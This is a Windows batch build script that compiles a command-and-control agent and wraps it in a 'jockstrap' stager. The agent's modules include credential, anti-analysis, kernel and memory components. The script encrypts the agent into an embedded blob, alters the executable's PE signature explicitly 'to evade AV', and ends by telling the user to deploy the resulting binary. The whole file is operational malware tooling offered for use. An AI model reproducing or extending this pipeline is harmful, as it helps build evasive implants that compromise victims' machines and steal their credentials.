@echo off
setlocal enabledelayedexpansion

:: ── Visual Studio environment ─────────────────────────────────────────
if exist "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    call "C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
)

echo building single-binary jockstrap stager...
echo.

set CFLAGS=/nologo /W3 /O2 /D_CRT_SECURE_NO_WARNINGS /D_WIN32_WINNT=0x0601 /D_CRT_NONSTDC_NO_DEPRECATE
set CFLAGS=%CFLAGS% /DWIN32_LEAN_AND_MEAN /D_WINSOCK_DEPRECATED_NO_WARNINGS
set CFLAGS=%CFLAGS% /Iinclude /Iplatform /Ikmod
:: force winsock2.h to load first in every TU (prevents legacy winsock.h)
set CFLAGS=%CFLAGS% /FIwinsock_compat.h
:: suppress harmless warnings from opaque syscall pointer casts
set CFLAGS=%CFLAGS% /wd4047 /wd4024

if not exist obj mkdir obj
if not exist out mkdir out

:: ── Step 1: build the C2 agent from source ────────────────────────────
echo -- [1/5] building C2 agent -------------------------------
cl %CFLAGS% /Foobj\agent_main.obj   /c src\main.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_agent.obj  /c src\agent.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_c2.obj     /c src\agent_c2.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_builtins.obj /c src\builtins.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_pure.obj    /c src\builtins\pure.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_system.obj  /c src\builtins\system.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_fs.obj      /c src\builtins\fs.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_data.obj    /c src\builtins\data.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_crypto.obj  /c src\builtins\crypto.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_kernel.obj  /c src\builtins\kernel.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_process.obj /c src\builtins\process.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_memory.obj  /c src\builtins\memory.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_net.obj     /c src\builtins\net.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_cred.obj     /c src\builtins\cred.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_anti.obj     /c src\builtins\anti.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\bi_util.obj     /c src\builtins\util.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_loader.obj /c src\loader.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_platform.obj /c src\platform\windows\platform.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_value.obj  /c src\value.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_vm.obj     /c src\vm.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_vmrun.obj  /c src\vm_runner_impl.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\agent_kernel.obj /c src\kernel_bridge.c
if errorlevel 1 goto fail

echo building jockey_agent.exe...
cl /nologo kernel32.lib ws2_32.lib advapi32.lib secur32.lib userenv.lib iphlpapi.lib /Feout\jockey_agent.exe ^
    obj\agent_main.obj obj\agent_agent.obj obj\agent_c2.obj obj\agent_builtins.obj ^
    obj\bi_pure.obj obj\bi_system.obj obj\bi_fs.obj obj\bi_data.obj ^
    obj\bi_crypto.obj obj\bi_kernel.obj obj\bi_process.obj obj\bi_memory.obj ^
    obj\bi_net.obj obj\bi_cred.obj obj\bi_anti.obj obj\bi_util.obj ^
    obj\agent_loader.obj obj\agent_platform.obj obj\agent_value.obj ^
    obj\agent_vm.obj obj\agent_vmrun.obj obj\agent_kernel.obj
if errorlevel 1 goto fail

:: ── Step 2: encrypt agent into blob header ────────────────────────────
echo.
echo -- [2/5] encrypting agent blob ---------------------------
python build_staged_agent.py out\jockey_agent.exe
if errorlevel 1 (
    echo *** ERROR: blob generation failed
    goto fail
)

:: ── Step 3: VM engine static lib ───────────────────────────────────────
echo.
echo -- [3/5] VM engine static lib -------------------------------
cl %CFLAGS% /Foobj\vm_core.obj /c src\vm.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\vm_value.obj /c src\value.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\vm_loader.obj /c src\loader.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\vm_builtins.obj /c src\builtins.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\vm_stub.obj /c src\builtins\stub.c
if errorlevel 1 goto fail
cl %CFLAGS% /Foobj\vm_runner.obj /c src\vm_runner_impl.c
if errorlevel 1 goto fail

echo building jockey_vm.lib...
lib /OUT:obj\jockey_vm.lib obj\vm_runner.obj obj\vm_core.obj obj\vm_value.obj obj\vm_loader.obj obj\vm_builtins.obj obj\vm_stub.obj
if errorlevel 1 goto fail

:: ── Step 4: build jockstrap.exe (single binary with embedded agent) ───
echo.
echo -- [4/5] jockstrap.exe (staged agent) -----------------------
cl %CFLAGS% /Foobj\jockstrap.obj /c src\jockstrap.c
if errorlevel 1 goto fail
if not exist src\jockstrap.res (
    rc.exe /fo src\jockstrap.res src\jockstrap.rc
    if errorlevel 1 goto fail
)
cl /nologo kernel32.lib version.lib /Feout\jockstrap.exe obj\jockstrap.obj obj\jockey_vm.lib src\jockstrap.res
if errorlevel 1 goto fail

:: ── Step 5: fix PE signature to evade AV ──────────────────────────────
echo.
echo -- [5/5] fixing PE signature -------------------------------
python pe_fix_signature.py out\jockstrap.exe out\jockstrap_fixed.exe
if errorlevel 1 (
    echo *** WARNING: signature fix failed, using unfixed binary
) else (
    del /f out\jockstrap.exe 2>nul
    ren out\jockstrap_fixed.exe jockstrap.exe
    if errorlevel 1 (
        echo *** WARNING: could not rename (defender lock?) - use out\jockstrap_fixed.exe
    ) else (
        echo signature fix applied
    )
)

echo.
echo -- done. deploy this: out\jockstrap.exe ---------------------
echo   Run with no args to execute embedded agent
echo   Run with --run x.jkb to execute bytecode
echo.
endlocal
exit /b 0

:fail
echo.
echo *** BUILD FAILED -- fix the errors above and re-run ***
endlocal
exit /b 1
